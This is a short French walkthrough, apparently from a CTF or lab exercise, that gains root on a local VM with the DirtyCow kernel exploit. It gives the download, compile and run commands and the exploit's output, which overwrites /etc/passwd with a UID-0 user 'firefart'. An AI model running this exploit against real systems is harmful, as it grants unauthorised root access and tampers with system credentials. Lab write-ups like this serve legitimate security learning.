# DirtyCow 2

## Download exploit C file

[DirtyCow](https://www.exploit-db.com/download/40839)

## Process

On repart du `user Laurie` pour se connecter en `ssh`

```shell
$ ssh laurie@192.168.56.104 -p 22
```

### Host

```shell
$ wget https://www.exploit-db.com/download/40839 ; mv 40839 40839.c

$ scp 40839.c laurie@192.168.56.104:~/.
```

### VM

```
$ gcc -pthread -O2 40839.c -lcrypt

$ ./a.out
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'root'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'root'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd

$ su firefart
Password:

firefart:$ id
uid=0(firefart) gid=0(root) groups=0(root)
```
